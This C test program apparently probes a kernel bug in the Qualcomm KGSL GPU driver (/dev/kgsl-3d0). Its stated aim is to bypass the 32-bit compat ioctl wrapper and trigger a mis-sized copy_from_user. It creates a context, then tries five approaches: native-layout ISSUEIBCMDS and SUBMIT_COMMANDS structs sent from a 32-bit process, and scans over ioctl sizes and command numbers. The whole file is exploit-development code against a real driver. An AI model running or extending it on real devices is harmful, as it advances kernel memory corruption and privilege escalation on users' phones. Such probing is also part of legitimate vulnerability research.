/**
 * test_bypass_compat.c — Bypass 32-bit compat wrapper, call regular handler directly
 *
 * Strategy: From 32-bit process, send 64-bit native struct with native command code.
 * If kgsl_compat_ioctl falls through to regular handler when no compat entry matches,
 * we can bypass the compat wrapper entirely and let TIF_32BIT trigger 16B CFU.
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("open: %d\n", errno); return 1; }
    printf("fd=%d (32-bit process)\n\n", fd);

    /* Create context */
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    errno = 0; int r = ioctl(fd, 0xc0080913, &ctx);
    printf("CREATE(0x12): ret=%d id=%u errno=%d\n\n", r, ctx.id, errno);
    if (r < 0) { close(fd); return 1; }

    /* ── Approach 1: Native 32-byte struct + native cmd from 32-bit ── */
    printf("=== Approach 1: Native 32B struct + 0xc0200910 ===\n");
    {
        struct { uint64_t ga; uint64_t sw; } ib = {0x0ULL, 0x1ULL};
        /* Build a native 32-byte struct manually on heap */
        uint8_t native[32];
        memset(native, 0, 32);
        *(uint32_t*)(native+0x00) = ctx.id;              /* drawctxt_id */
        *(uint32_t*)(native+0x04) = 0;                   /* flags */
        *(uint64_t*)(native+0x08) = (uint64_t)(uintptr_t)&ib; /* ibdesc_addr */
        *(uint32_t*)(native+0x10) = 1;                   /* numibs */
        *(uint32_t*)(native+0x18) = 0;                   /* timestamp */

        errno = 0;
        r = ioctl(fd, 0xc0200910, native);
        printf("  native cmd: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"OK ✅");
    }

    /* ── Approach 2: Vary command size to find one that reaches handler ── */
    printf("\n=== Approach 2: Command size scan ===\n");
    {
        struct { uint64_t ga; uint64_t sw; } ib = {0x0ULL, 0x1ULL};
        uint8_t buf[64];
        memset(buf, 0, 64);
        *(uint32_t*)(buf+0x00) = ctx.id;
        *(uint64_t*)(buf+0x08) = (uint64_t)(uintptr_t)&ib;
        *(uint32_t*)(buf+0x10) = 1;   /* numibs */
        *(uint32_t*)(buf+0x18) = 0;   /* timestamp */

        for (int sz = 20; sz <= 48; sz += 4) {
            uint32_t cmd = ((uint32_t)3<<30)|(((uint32_t)sz)<<16)|(((uint32_t)0x09)<<8)|(0x10);
            errno = 0;
            r = ioctl(fd, cmd, buf);
            if (r == 0 || errno != 22) {
                printf("  sz=%d cmd=0x%08x: ret=%d errno=%d %s\n",
                       sz, cmd, r, errno, r==0?"✅ SUCCESS!":strerror(errno));
            }
        }
    }

    /* ── Approach 3: Use 64-bit struct with compat cmd (reverse of what worked) ── */
    printf("\n=== Approach 3: 32B struct + compat cmd (0xc0140910) ===\n");
    {
        struct { uint64_t ga; uint64_t sw; } ib = {0x0ULL, 0x1ULL};
        uint8_t buf[32];
        memset(buf, 0, 32);
        *(uint32_t*)(buf+0x00) = ctx.id;
        *(uint32_t*)(buf+0x04) = 0;
        *(uint64_t*)(buf+0x08) = (uint64_t)(uintptr_t)&ib;
        *(uint32_t*)(buf+0x10) = 1;
        *(uint32_t*)(buf+0x14) = 0;
        *(uint32_t*)(buf+0x18) = 0;

        errno = 0;
        r = ioctl(fd, 0xc0140910, buf);
        printf("  compat cmd + 32B struct: ret=%d errno=%d (%s)\n",
               r, errno, r<0?strerror(errno):"OK ✅");
    }

    /* ── Approach 4: Try SUBMIT_COMMANDS with native struct from 32-bit ── */
    printf("\n=== Approach 4: SUBMIT_COMMANDS native 56B from 32-bit ===\n");
    {
        uint8_t sbuf[56];
        memset(sbuf, 0, 56);
        *(uint32_t*)(sbuf+0x00) = ctx.id;
        *(uint64_t*)(sbuf+0x08) = (uint64_t)(uintptr_t)&((struct{uint64_t a;uint64_t b;}){0,1});  /* cmdlist */
        *(uint32_t*)(sbuf+0x10) = 16;  /* cmdlist size */
        *(uint32_t*)(sbuf+0x14) = 1;   /* numcmds */

        errno = 0;
        r = ioctl(fd, 0xc038093d, sbuf);
        printf("  native 0xc038093d: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"OK ✅");

        /* Also try compat size (0xc02c093d) */
        errno = 0;
        r = ioctl(fd, 0xc02c093d, sbuf);
        printf("  compat 0xc02c093d: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"OK ✅");
    }

    /* ── Approach 5: Try direct ioctl on kgsl fd with generic ioctl path ── */
    printf("\n=== Approach 5: Generic ioctl dispatch try ===\n");
    /* What if we use the file_operations->compat_ioctl path differently? */
    /* Try calling the compat wrapper's native command with different size */
    for (int nr_delta = 0; nr_delta < 3; nr_delta++) {
        uint32_t nr = 0x10 + nr_delta * 0x100;  /* try 0x10, 0x110, 0x210 */
        uint32_t cmd = ((uint32_t)3<<30)|(((uint32_t)0x20)<<16)|(((uint32_t)0x09)<<8)|(nr & 0xFF);
        uint8_t buf[32] = {0};
        *(uint32_t*)(buf+0x00) = ctx.id;
        *(uint32_t*)(buf+0x10) = 1;
        errno = 0;
        r = ioctl(fd, cmd, buf);
        printf("  nr=0x%x cmd=0x%08x: ret=%d errno=%d\n", nr & 0xFF, cmd, r, errno);
    }

    ioctl(fd, 0x40040914, &ctx.id);
    close(fd);
    return 0;
}
